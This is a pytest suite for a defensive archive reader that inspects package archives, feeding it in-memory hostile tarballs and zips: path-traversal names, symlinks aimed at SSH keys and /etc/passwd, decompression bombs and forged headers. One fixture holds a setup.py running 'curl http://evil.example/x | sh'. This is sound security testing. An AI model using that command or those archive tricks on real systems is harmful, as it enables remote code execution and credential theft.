"""Adversarial tests for the hostile-archive reader. Every archive is built in memory."""

from __future__ import annotations

import hashlib
import io
import itertools
import ntpath
import posixpath
import re
import stat
import struct
import tarfile
import time
import tracemalloc
import warnings
import zipfile
import zlib

import pytest
from hypothesis import given
from hypothesis import settings as hsettings
from hypothesis import strategies as st

from app.analysis.analyzers.base import PackageContext
from app.analysis.analyzers.install_script import InstallScriptAnalyzer
from app.analysis.extraction.safe_archive import (
    ABORTING_PATH_PROBLEMS,
    TEXT_BUDGET_SKIP_REASON,
    SafeArchiveReader,
    _Abort,
    _BoundedReader,
    detect_archive_format,
    detect_magic,
    normalize_member_path,
)
from app.analysis.signals import Code
from app.core.config import settings

ELF = b"\x7fELF\x02\x01\x01" + b"\x00" * 100


# --------------------------------------------------------------------------- builders
def _tar(members, *, mode="w:gz", fmt=tarfile.PAX_FORMAT) -> bytes:
    """members: (name, data) for regular files, or a prepared TarInfo for special members."""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode=mode, format=fmt) as tar:
        for item in members:
            if isinstance(item, tarfile.TarInfo):
                tar.addfile(item)
                continue
            name, data = item
            info = tarfile.TarInfo(name)
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))
    return buf.getvalue()


def _special(name: str, type_: bytes, linkname: str = "") -> tarfile.TarInfo:
    info = tarfile.TarInfo(name)
    info.type = type_
    info.linkname = linkname
    return info


def _raw_tar_gz(headers_and_data: list[tuple[tarfile.TarInfo, bytes]], trailer: bytes = b"\x00" * 1024) -> bytes:
    """Hand-assembled tar (header blocks written verbatim, sizes not validated) then gzip."""
    raw = bytearray()
    for info, data in headers_and_data:
        raw += info.tobuf(format=tarfile.GNU_FORMAT)
        raw += data + b"\x00" * (-len(data) % 512)
    raw += trailer
    return _gzip(bytes(raw))


def _gzip(data: bytes) -> bytes:
    co = zlib.compressobj(9, zlib.DEFLATED, 31)
    return co.compress(data) + co.flush()


def _zip(entries, *, compression=zipfile.ZIP_DEFLATED) -> bytes:
    buf = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore")  # duplicate-name warnings are intentional in some tests
        with zipfile.ZipFile(buf, "w", compression=compression) as zf:
            for item in entries:
                if isinstance(item, tuple) and isinstance(item[0], zipfile.ZipInfo):
                    zf.writestr(item[0], item[1])
                else:
                    zf.writestr(item[0], item[1])
    return buf.getvalue()


def _patch(data: bytes, signature: bytes, offset: int, fmt: str, value, occurrence: int = 0) -> bytes:
    pos = -1
    for _ in range(occurrence + 1):
        pos = data.index(signature, pos + 1)
    buf = bytearray(data)
    struct.pack_into(fmt, buf, pos + offset, value)
    return bytes(buf)


def read(data: bytes, filename: str = "pkg-1.0.tar.gz", **limits):
    return SafeArchiveReader(**limits).read(data, filename)


# --------------------------------------------------------------------------- happy path
def test_sdist_members_inventoried_hashed_and_top_dir_stripped():
    setup = b"from setuptools import setup\nsetup()\n"
    result = read(_tar([("pkg-1.0/setup.py", setup), ("pkg-1.0/pkg/native.so", ELF), ("pkg-1.0/README.md", b"# hi")]))
    assert result.aborted_reason is None and result.archive_format == "gzip"
    assert [f.relpath for f in result.files] == ["setup.py"]
    assert result.files[0].sha256 == hashlib.sha256(setup).hexdigest()
    by_path = {e.relpath: e for e in result.inventory}
    assert by_path["pkg/native.so"].magic == "elf" and by_path["pkg/native.so"].is_executable_binary
    assert by_path["pkg/native.so"].retained and result.binaries["pkg/native.so"] == ELF
    assert by_path["README.md"].sha256 == hashlib.sha256(b"# hi").hexdigest()


def test_wheel_relpaths_keep_top_level_directory():
    data = _zip([("pkg/__init__.py", "x = 1\n"), ("pkg-1.0.dist-info/METADATA", "Name: pkg\n")])
    wheel = read(data, "pkg-1.0-py3-none-any.whl")
    assert {f.relpath for f in wheel.files} == {"pkg/__init__.py", "pkg-1.0.dist-info/METADATA"}
    sdist_zip = read(data, "pkg-1.0.zip")
    assert "__init__.py" in {f.relpath for f in sdist_zip.files}


def test_format_detected_by_magic_not_extension():
    result = read(_tar([("pkg-1.0/setup.py", b"x=1\n")]), "innocent.whl")
    assert result.archive_format == "gzip" and result.aborted_reason is None
    assert any(w.startswith("format_mismatch") for w in result.warnings)
    assert detect_archive_format(_tar([("a", b"")], mode="w:bz2")) == "bzip2"
    assert detect_archive_format(_tar([("a", b"")], mode="w:xz")) == "xz"
    assert detect_archive_format(_tar([("a", b"")], mode="w")) == "tar"


@pytest.mark.parametrize("mode", ["w:bz2", "w:xz", "w"])
def test_other_tar_compressions_read(mode):
    result = read(_tar([("pkg-1.0/mod.py", b"import os\n")], mode=mode))
    assert result.aborted_reason is None and [f.relpath for f in result.files] == ["mod.py"]


# --------------------------------------------------------------------------- traversal / unsafe paths
def test_zip_slip_aborts():
    result = read(_zip([("pkg/../../evil.py", "import os")]), "pkg.zip")
    assert result.aborted_reason == "unsafe_path" and "traversal" in result.abort_detail
    assert result.files == []


@pytest.mark.parametrize("name,problem", [
    ("pkg/../../evil.py", "traversal"),
    ("pkg\\..\\..\\evil.py", "traversal"),
    ("pkg/.. /evil.py", "traversal"),
    ("/etc/cron.d/evil", "absolute_path"),
    ("C:/Windows/evil.dll", "drive_letter"),
    ("c:evil.py", "drive_letter"),
    ("\\\\server\\share\\evil.py", "unc_path"),
])
def test_tar_unsafe_paths_abort(name, problem):
    result = read(_tar([("pkg-1.0/ok.py", b"x=1\n"), (name, b"payload")]))
    assert result.aborted_reason == "unsafe_path"
    assert result.abort_detail.startswith(problem)
    assert [f.relpath for f in result.files] == ["ok.py"]  # members before the abort are kept


def test_symlink_and_hardlink_members_recorded_not_followed():
    members = [
        ("pkg-1.0/setup.py", b"x=1\n"),
        _special("pkg-1.0/steal", tarfile.SYMTYPE, "/home/user/.ssh/id_rsa"),
        _special("pkg-1.0/hard.py", tarfile.LNKTYPE, "pkg-1.0/setup.py"),
    ]
    result = read(_tar(members))
    by_path = {e.relpath: e for e in result.inventory}
    assert by_path["steal"].kind == "symlink" and by_path["steal"].skipped_reason == "symlink"
    assert by_path["hard.py"].kind == "hardlink" and by_path["hard.py"].sha256 is None
    assert {f.relpath for f in result.files} == {"setup.py"}
    assert any("points outside the archive" in w for w in result.warnings)


def test_device_and_fifo_members_recorded_not_read():
    result = read(_tar([_special("pkg-1.0/tty", tarfile.CHRTYPE), _special("pkg-1.0/blk", tarfile.BLKTYPE),
                        _special("pkg-1.0/pipe", tarfile.FIFOTYPE)]))
    kinds = {e.relpath: (e.kind, e.skipped_reason) for e in result.inventory}
    assert kinds == {"tty": ("device", "device"), "blk": ("device", "device"), "pipe": ("other", "fifo")}
    assert result.aborted_reason is None and not result.binaries


def _zip_info(name: str, file_type: int, perms: int = 0o644) -> zipfile.ZipInfo:
    info = zipfile.ZipInfo(name)
    info.create_system = 3
    info.external_attr = (file_type | perms) << 16
    return info


def test_zip_mode_bits_cannot_hide_member_content():
    """Regression: pip and zipfile write every entry whose name does not end in '/' as a regular file,
    whatever its Unix mode bits claim, so symlink / dir / device bits must not suppress analysis."""
    payload = "import os\nos.system('echo pwned')\n"
    data = _zip([
        (_zip_info("evilpkg/__init__.py", stat.S_IFLNK, 0o777), payload),
        (_zip_info("evilpkg/core.py", stat.S_IFDIR, 0o755), payload),
        (_zip_info("evilpkg/tty.py", stat.S_IFCHR), payload),
        (_zip_info("evilpkg/link", stat.S_IFLNK, 0o777), "/etc/passwd"),
        (_zip_info("evilpkg/sub/", stat.S_IFDIR, 0o755), ""),
        ("evilpkg-1.0.dist-info/METADATA", "Name: evilpkg\n"),
    ])
    result = read(data, "evilpkg-1.0-py3-none-any.whl")
    assert result.aborted_reason is None
    files = {f.relpath: f.text for f in result.files}
    assert {k: v for k, v in files.items() if k.startswith("evilpkg/")} == {
        "evilpkg/__init__.py": payload, "evilpkg/core.py": payload, "evilpkg/tty.py": payload}
    by_path = {e.relpath: e for e in result.inventory}
    assert {p: (by_path[p].kind, by_path[p].declared_kind) for p in
            ("evilpkg/__init__.py", "evilpkg/core.py", "evilpkg/tty.py", "evilpkg/link", "evilpkg/sub")} == {
        "evilpkg/__init__.py": ("file", "symlink"), "evilpkg/core.py": ("file", "dir"),
        "evilpkg/tty.py": ("file", "device"), "evilpkg/link": ("file", "symlink"), "evilpkg/sub": ("dir", None)}
    assert by_path["evilpkg/__init__.py"].sha256 == hashlib.sha256(payload.encode()).hexdigest()
    # A symlink-flagged entry's bytes are read literally (what pip writes); the target is never followed.
    assert result.binaries["evilpkg/link"] == b"/etc/passwd"
    assert sum("claims symlink mode bits" in w for w in result.warnings) == 2


def test_control_characters_in_tar_name_skipped_and_recorded():
    result = read(_tar([("pkg-1.0/evil\x1b[31m.py", b"import os\n"), ("pkg-1.0/ok.py", b"x=1\n")]))
    assert result.aborted_reason is None
    skipped = [e for e in result.inventory if e.skipped_reason == "control_character"]
    assert len(skipped) == 1 and "\x1b" not in skipped[0].relpath
    assert [f.relpath for f in result.files] == ["ok.py"]


def test_nul_in_pax_path_is_not_truncated_into_a_plausible_name():
    info = tarfile.TarInfo("pkg-1.0/placeholder")
    info.pax_headers = {"path": "pkg-1.0/setup.py\x00.txt"}
    info.size = 4
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz", format=tarfile.PAX_FORMAT) as tar:
        tar.addfile(info, io.BytesIO(b"x=1\n"))
    result = read(buf.getvalue())
    assert result.files == []
    assert [e.skipped_reason for e in result.inventory] == ["control_character"]


def test_nul_in_zip_name_detected_from_raw_header():
    data = _zip([("pkg/setupXpy.txt", "x=1")])
    data = data.replace(b"setupXpy", b"setup\x00py")  # both local and central headers
    result = read(data, "pkg-1.0-py3-none-any.whl")
    assert result.files == []
    assert result.inventory[0].skipped_reason == "control_character"


def test_deep_and_long_paths_skipped():
    deep = "pkg-1.0/" + "d/" * (settings.MAX_PATH_DEPTH + 2) + "payload.py"
    long = "pkg-1.0/" + "a" * (settings.MAX_PATH_LENGTH + 10) + ".py"
    result = read(_tar([(deep, b"import os\n"), (long, b"import os\n")]))
    assert result.aborted_reason is None and result.files == []
    assert sorted(e.skipped_reason for e in result.inventory) == ["path_too_deep", "path_too_long"]


def test_unicode_names_retained_and_bidi_names_warned():
    result = read(_tar([("pkg-1.0/модуль.py", b"x=1\n"), ("pkg-1.0/日本/a.py", b"y=2\n"),
                        ("pkg-1.0/gpj.\u202eexe.py", b"z=3\n")]))
    assert {f.relpath for f in result.files} == {"модуль.py", "日本/a.py", "gpj.\u202eexe.py"}
    assert any("deceptive" in w and "\u202e" not in w for w in result.warnings)


# --------------------------------------------------------------------------- bombs
def test_tar_member_count_bomb():
    result = read(_tar([(f"pkg-1.0/f{i}.py", b"x=1\n") for i in range(30)]), max_members=10)
    assert result.aborted_reason == "too_many_members" and result.stats["members"] == 11


def test_zip_member_count_bomb_even_with_lying_end_record():
    data = _zip([(f"pkg/f{i}.py", "x=1") for i in range(50)])
    lying = data[:-22] + data[-22:-14] + struct.pack("<HH", 1, 1) + data[-10:]
    for archive in (data, lying):
        result = read(archive, "pkg-1.0-py3-none-any.whl", max_members=10)
        assert result.aborted_reason == "too_many_members"
        assert result.inventory == []  # refused before any entry was materialised


def test_zip_declared_size_bomb_refused_before_reading():
    zeros = b"\x00" * (1024 * 1024)
    result = read(_zip([("pkg/a.bin", zeros), ("pkg/b.bin", zeros)]), "pkg.zip", max_declared_bytes=1536 * 1024)
    assert result.aborted_reason == "declared_size_exceeded"
    assert result.stats["read_bytes"] == 0 and result.inventory == []


def test_skipped_multi_gigabyte_member_aborts_without_decompressing():
    """A non-interesting 4 GiB member of zeros compressed small must never be decompressed."""
    header = tarfile.TarInfo("pkg-1.0/data/blob.bin")
    header.size = 4 * 1024 ** 3
    co = zlib.compressobj(9, zlib.DEFLATED, 31)
    body = co.compress(header.tobuf(format=tarfile.GNU_FORMAT))
    for _ in range(16):  # 16 MiB of real zero data follows; the header promises 4 GiB
        body += co.compress(b"\x00" * (1024 * 1024))
    body += co.flush(zlib.Z_SYNC_FLUSH)
    assert len(body) < 64 * 1024
    started = time.monotonic()
    result = read(body)
    assert result.aborted_reason == "declared_size_exceeded"
    assert result.stats["read_bytes"] <= 64 * 1024
    assert time.monotonic() - started < 2.0


def test_many_small_members_cannot_exceed_declared_budget():
    members = [(f"pkg-1.0/data{i}.bin", b"\x00" * 4096) for i in range(10)]
    result = read(_tar(members), max_declared_bytes=16 * 1024)
    # Four members exactly fill the budget; the fifth header trips it before its data is read.
    assert result.aborted_reason == "declared_size_exceeded" and result.stats["members"] == 5
    assert len(result.inventory) == 4


def test_oversized_pax_header_refused_before_buffering():
    pax = tarfile.TarInfo("././@PaxHeader")
    pax.type = tarfile.XHDTYPE
    pax.size = 100 * 1024 * 1024
    co = zlib.compressobj(9, zlib.DEFLATED, 31)
    body = co.compress(pax.tobuf(format=tarfile.GNU_FORMAT)) + co.compress(b"9" * (4 * 1024 * 1024))
    body += co.flush(zlib.Z_SYNC_FLUSH)
    result = read(body)
    assert result.aborted_reason == "tar_metadata_header_too_large"
    assert result.stats["read_bytes"] <= 16 * 1024


def test_long_pax_header_chain_refused():
    entries = []
    for _ in range(40):
        pax = tarfile.TarInfo("././@PaxHeader")
        pax.type = tarfile.XHDTYPE
        pax.size = 0
        entries.append((pax, b""))
    real = tarfile.TarInfo("pkg-1.0/setup.py")
    real.size = 4
    entries.append((real, b"x=1\n"))
    result = read(_raw_tar_gz(entries))
    assert result.aborted_reason == "tar_metadata_chain_too_long"


def test_sparse_member_refused():
    sparse = tarfile.TarInfo("pkg-1.0/sparse.bin")
    sparse.type = tarfile.GNUTYPE_SPARSE
    result = read(_raw_tar_gz([(sparse, b"")]))
    assert result.aborted_reason == "sparse_member_unsupported"


def test_unknown_tar_member_type_is_analysed_as_file():
    odd = tarfile.TarInfo("pkg-1.0/setup.py")
    odd.type = b"Z"
    odd.size = 13
    result = read(_raw_tar_gz([(odd, b"import os\nx=1")]))
    assert [f.relpath for f in result.files] == ["setup.py"]
    assert any("unknown tar member type" in w for w in result.warnings)


def test_bounded_reader_refuses_before_reading():
    raw = io.BytesIO(b"x" * 100)
    reader = _BoundedReader(raw, 50, lambda: None)
    assert reader.read(40) == b"x" * 40
    with pytest.raises(_Abort) as info:
        reader.read(40)
    assert info.value.reason == "decompressed_size_exceeded"
    assert raw.tell() == 40  # nothing was decompressed for the refused read


def test_retained_text_budget_skips_members_without_aborting():
    members = [("pkg-1.0/a.py", b"A" * 600), ("pkg-1.0/b.py", b"B" * 600), ("pkg-1.0/c.py", b"C" * 300)]
    result = read(_tar(members), max_text_bytes=1000)
    assert result.aborted_reason is None
    assert [f.relpath for f in result.files] == ["a.py", "c.py"]  # c.py still fits after b.py was skipped
    skipped = {e.relpath: e for e in result.inventory}["b.py"]
    assert skipped.skipped_reason == TEXT_BUDGET_SKIP_REASON and not skipped.retained
    assert skipped.sha256 == hashlib.sha256(b"B" * 600).hexdigest()  # still hashed and inventoried
    assert result.stats["text_budget_skipped"] == 1


def test_bulk_text_before_install_hooks_cannot_keep_them_from_analysis():
    """Regression: junk text placed before setup.py used to abort extraction with setup.py unread."""
    setup = b"import os\nos.system('curl http://evil.example/x | sh')\nfrom setuptools import setup\nsetup()\n"
    members = [(f"pkg-1.0/docs/junk{i:03}.txt", b"j" * 400) for i in range(10)]
    members += [("pkg-1.0/setup.py", setup), ("pkg-1.0/zz_hook.pth", b"import os\n")]
    result = read(_tar(members), max_text_bytes=1000, max_file_bytes=400)
    assert result.aborted_reason is None
    assert {"setup.py", "zz_hook.pth"} <= {f.relpath for f in result.files}
    assert sum(e.skipped_reason == TEXT_BUDGET_SKIP_REASON for e in result.inventory) == 8
    ctx = PackageContext(ecosystem="pypi", name="pkg", version="1.0", files=result.files)
    assert Code.INSTALL_HOOK_EXEC in {f.code for f in InstallScriptAnalyzer().analyze(ctx)}


def test_exhausting_the_install_file_reserve_is_a_hostile_abort():
    members = [(f"pkg-1.0/h{i}.pth", b"import os\n" * 50) for i in range(5)]
    result = read(_tar(members), max_priority_text_bytes=1200)
    assert result.aborted_reason == "priority_text_budget_exceeded"
    assert [f.relpath for f in result.files] == ["h0.pth", "h1.pth"]


def test_wall_clock_budget():
    ticks = itertools.count(0, 10)
    reader = SafeArchiveReader(time_budget_seconds=25, clock=lambda: next(ticks))
    result = reader.read(_tar([(f"pkg-1.0/f{i}.py", b"x=1\n") for i in range(10)]), "pkg.tar.gz")
    assert result.aborted_reason == "time_budget_exceeded"


# --------------------------------------------------------------------------- corrupt / lying input
def test_truncated_gzip_aborts_as_corrupt():
    data = _tar([("pkg-1.0/big.py", bytes(range(256)) * 400)])
    result = read(data[: len(data) // 2])
    assert result.aborted_reason == "corrupt_archive"


def test_gzip_of_non_tar_is_corrupt():
    assert read(_gzip(b"just some text, not a tar archive" * 100)).aborted_reason == "corrupt_archive"


def test_zip_central_directory_understates_size_detected_by_crc():
    data = _zip([("pkg/mod.py", "import os\n" * 100)])
    lying = _patch(data, b"PK\x01\x02", 24, "<I", 5)
    result = read(lying, "pkg-1.0-py3-none-any.whl")
    assert result.aborted_reason == "corrupt_archive" and result.files == []


def test_zip_stored_entry_with_inconsistent_sizes():
    data = _zip([("pkg/mod.py", "x=1\n")], compression=zipfile.ZIP_STORED)
    lying = _patch(data, b"PK\x01\x02", 24, "<I", 14)
    assert read(lying, "pkg.whl").aborted_reason == "inconsistent_member_header"


def test_zip_deflate_ratio_beyond_deflate_capability():
    data = _zip([("pkg/blob.bin", "\x00" * 1000)])
    lying = _patch(data, b"PK\x01\x02", 24, "<I", 50 * 1024 * 1024)
    assert read(lying, "pkg.whl").aborted_reason == "suspicious_compression_ratio"


def _lying_codec_zip(compression: int, payload_size: int, declared: int = 1024) -> bytes:
    """One member that really expands to ``payload_size`` zeros while every header declares ``declared``
    bytes with the CRC of ``declared`` zeros, so only a bounded decompressor can notice the lie."""
    data = _zip([("pkg/blob.bin", b"\x00" * payload_size)], compression=compression)
    crc = zlib.crc32(b"\x00" * declared)
    for signature, crc_offset, size_offset in ((b"PK\x03\x04", 14, 22), (b"PK\x01\x02", 16, 24)):
        data = _patch(data, signature, crc_offset, "<I", crc)
        data = _patch(data, signature, size_offset, "<I", declared)
    return data


@pytest.mark.parametrize("compression", [zipfile.ZIP_BZIP2, zipfile.ZIP_LZMA], ids=["bzip2", "lzma"])
def test_bzip2_and_lzma_bombs_are_decompressed_with_bounded_memory(compression):
    """Regression: zipfile decompresses bzip2/LZMA members whole on the first read (no max_length)."""
    payload = 48 * 1024 * 1024
    data = _lying_codec_zip(compression, payload)
    assert len(data) < 64 * 1024
    tracemalloc.start()
    try:
        result = read(data, "pkg-1.0-py3-none-any.whl")
        _, peak = tracemalloc.get_traced_memory()
    finally:
        tracemalloc.stop()
    assert result.aborted_reason == "member_size_mismatch"
    assert peak < 16 * 1024 * 1024, f"peak traced memory {peak} bytes"


@pytest.mark.parametrize("compression", [zipfile.ZIP_BZIP2, zipfile.ZIP_LZMA], ids=["bzip2", "lzma"])
def test_honest_bzip2_and_lzma_members_are_read_and_crc_checked(compression):
    text = "".join(f"value_{i} = {i}\n" for i in range(20_000))  # > 64 KiB: several bounded reads
    blob = bytes(range(256)) * 400
    data = _zip([("pkg/mod.py", text), ("pkg/blob.bin", blob)], compression=compression)
    result = read(data, "pkg-1.0-py3-none-any.whl")
    assert result.aborted_reason is None
    assert [f.text for f in result.files] == [text]
    assert result.binaries["pkg/blob.bin"] == blob
    tampered = _patch(data, b"PK\x01\x02", 16, "<I", zlib.crc32(b"forged"))
    assert read(tampered, "pkg-1.0-py3-none-any.whl").aborted_reason == "corrupt_archive"


def test_lzma_member_with_oversized_dictionary_is_refused_before_decompressing():
    data = _zip([("pkg/blob.bin", b"\x00" * 4096)], compression=zipfile.ZIP_LZMA)
    data = _patch(data, b"PK\x01\x02", 24, "<I", 200 * 1024 * 1024)  # a large declared size allows a large dictionary
    local = data.index(b"PK\x03\x04")
    name_len, extra_len = struct.unpack_from("<2H", data, local + 26)
    buf = bytearray(data)
    struct.pack_into("<I", buf, local + 30 + name_len + extra_len + 5, 1 << 30)  # LZMA props: 1 GiB dictionary
    result = read(bytes(buf), "pkg-1.0-py3-none-any.whl")
    assert result.aborted_reason == "lzma_dictionary_too_large" and result.stats["read_bytes"] == 0


def test_zip_local_header_name_differs_from_central_directory():
    data = _zip([("pkg/good.py", "x=1\n")])
    local_name = data.index(b"pkg/good.py")  # first occurrence is the local header
    tampered = data[:local_name] + b"pkg/evil.py" + data[local_name + len(b"pkg/good.py"):]
    assert read(tampered, "pkg.whl").aborted_reason == "corrupt_archive"


def test_encrypted_zip_entry_skipped_with_warning():
    data = _zip([("pkg/secret.py", "x=1\n")])
    data = _patch(data, b"PK\x03\x04", 6, "<H", 0x1)
    data = _patch(data, b"PK\x01\x02", 8, "<H", 0x1)
    result = read(data, "pkg.whl")
    assert result.aborted_reason is None and result.files == []
    assert result.inventory[0].skipped_reason == "encrypted"
    assert any("encrypted" in w for w in result.warnings)


def test_nested_archives_recorded_not_recursed():
    inner_zip = _zip([("evil.py", "import os")])
    inner_tgz = _tar([("x/evil.py", b"import os")])
    result = read(_tar([("pkg-1.0/tests/fixture.zip", inner_zip), ("pkg-1.0/data.tar.gz", inner_tgz)]))
    magic = {e.relpath: e.magic for e in result.inventory}
    assert magic == {"tests/fixture.zip": "zip", "data.tar.gz": "gzip"}
    assert result.files == [] and set(result.binaries) == {"tests/fixture.zip", "data.tar.gz"}


def test_duplicate_zip_names_recorded():
    result = read(_zip([("pkg/__init__.py", "benign = 1\n"), ("pkg/__init__.py", "import os\n")]), "pkg.whl")
    assert [e.relpath for e in result.inventory] == ["pkg/__init__.py", "pkg/__init__.py"]
    assert [f.text for f in result.files] == ["benign = 1\n", "import os\n"]
    assert any("duplicate member name" in w for w in result.warnings)


def test_empty_archives_and_non_archives():
    empty_tgz = read(_tar([]))
    assert empty_tgz.aborted_reason is None and "empty_archive" in empty_tgz.warnings
    empty_zip = read(_zip([]), "pkg.zip")
    assert empty_zip.aborted_reason is None and empty_zip.inventory == []
    assert read(b"", "pkg.tar.gz").aborted_reason == "unsupported_format"
    assert read(b"<html>not an archive</html>" * 50, "pkg.tar.gz").aborted_reason == "unsupported_format"
    assert read(b"PK\x03\x04 truncated zip", "pkg.whl").aborted_reason == "corrupt_archive"


# --------------------------------------------------------------------------- retention rules
def test_text_requires_no_nul_in_first_8kib_and_truncates():
    nul_early = b"x = 1\n\x00" + b"a" * 100
    nul_late = b"a" * (9 * 1024) + b"\x00"
    big = b"# " + b"b" * 5000
    result = read(_tar([("pkg-1.0/early.py", nul_early), ("pkg-1.0/late.py", nul_late), ("pkg-1.0/big.py", big)]),
                  max_file_bytes=4096 * 3)
    files = {f.relpath: f for f in result.files}
    assert "early.py" not in files and result.binaries["early.py"] == nul_early
    assert "late.py" in files
    small = read(_tar([("pkg-1.0/big.py", big)]), max_file_bytes=100).files[0]
    assert small.truncated and len(small.text) == 100 and small.size == len(big)
    assert small.sha256 == hashlib.sha256(big).hexdigest()


def test_binary_retention_budgets():
    members = [(f"pkg-1.0/b{i}.bin", bytes([i]) * 100) for i in range(3)] + [("pkg-1.0/huge.bin", b"h" * 300)]
    result = read(_tar(members), max_binary_bytes=250, max_binary_file_bytes=200)
    assert set(result.binaries) == {"b0.bin", "b1.bin"}
    unretained = {e.relpath: e for e in result.inventory if not e.retained}
    assert set(unretained) == {"b2.bin", "huge.bin"}
    assert unretained["huge.bin"].sha256 == hashlib.sha256(b"h" * 300).hexdigest()


def test_multiple_top_level_directories_warned():
    result = read(_tar([("pkg-1.0/setup.py", b"x=1\n"), ("other/setup.py", b"import os\n")]))
    assert any("more than one top-level directory" in w for w in result.warnings)


def test_mode_bits_recorded():
    info = tarfile.TarInfo("pkg-1.0/run.sh")
    info.size = 3
    info.mode = 0o4755
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        tar.addfile(info, io.BytesIO(b"ls\n"))
    assert read(buf.getvalue()).inventory[0].mode == 0o4755


# --------------------------------------------------------------------------- magic detection
def test_magic_detection():
    pe = bytearray(b"MZ" + b"\x00" * 0x100)
    struct.pack_into("<I", pe, 0x3C, 0x80)
    pe[0x80:0x84] = b"PE\x00\x00"
    assert detect_magic(bytes(pe)) == "pe"
    assert detect_magic(b"MZ is how this text file starts" + b" " * 100) is None
    assert detect_magic(b"\xca\xfe\xba\xbe\x00\x00\x00\x02") == "macho"
    assert detect_magic(b"\xca\xfe\xba\xbe\x00\x00\x00\x34") is None  # Java class file
    assert detect_magic(b"\xcf\xfa\xed\xfe" + b"\x00" * 8) == "macho"
    assert detect_magic(b"7z\xbc\xaf\x27\x1c\x00\x04") == "7z"
    assert detect_magic(b"Rar!\x1a\x07\x01\x00") == "rar"
    assert detect_magic(b"BZh is not enough") is None


# --------------------------------------------------------------------------- path normaliser properties
_component = st.text(alphabet=st.characters(blacklist_categories=("Cs",)), max_size=12)
_safe_component = st.text(alphabet=st.characters(whitelist_categories=("L", "N"), whitelist_characters="-_."),
                           min_size=1, max_size=10).filter(lambda s: s.strip(".") != "")


@hsettings(max_examples=300, deadline=None)
@given(st.lists(_component, min_size=1, max_size=40), st.sampled_from(["/", "\\"]))
def test_accepted_paths_are_always_contained(parts, sep):
    path, problem = normalize_member_path(sep.join(parts))
    if problem is not None:
        return
    components = path.split("/")
    assert "\\" not in path and not path.startswith("/") and not re.match(r"^[A-Za-z]:", path)
    assert not {"", ".", ".."} & set(components)
    assert not any(ord(c) < 32 or ord(c) == 127 for c in path)
    assert len(components) <= settings.MAX_PATH_DEPTH and len(path) <= settings.MAX_PATH_LENGTH
    assert posixpath.normpath("/root/" + path).startswith("/root/")
    assert ntpath.normpath("C:\\root\\" + path.replace("/", "\\")).startswith("C:\\root\\")
    assert normalize_member_path(path) == (path, None)  # idempotent


@hsettings(max_examples=200, deadline=None)
@given(st.lists(_component, max_size=5), st.lists(_component, max_size=5), st.sampled_from(["/", "\\"]))
def test_any_parent_reference_aborts(before, after, sep):
    _, problem = normalize_member_path(sep.join([*before, "..", *after]))
    assert problem in ABORTING_PATH_PROBLEMS


@hsettings(max_examples=200, deadline=None)
@given(st.lists(_safe_component, min_size=1, max_size=10))
def test_separator_style_is_irrelevant(parts):
    assert normalize_member_path("/".join(parts)) == normalize_member_path("\\".join(parts))
    assert normalize_member_path("/".join(parts))[1] is None


@hsettings(max_examples=100, deadline=None)
@given(st.text(max_size=20), st.sampled_from(["\x00", "\x07", "\x1b", "\x7f", "\ud800"]))
def test_control_and_surrogate_characters_never_accepted(text, bad):
    _, problem = normalize_member_path(f"pkg/{text}{bad}.py")
    assert problem is not None
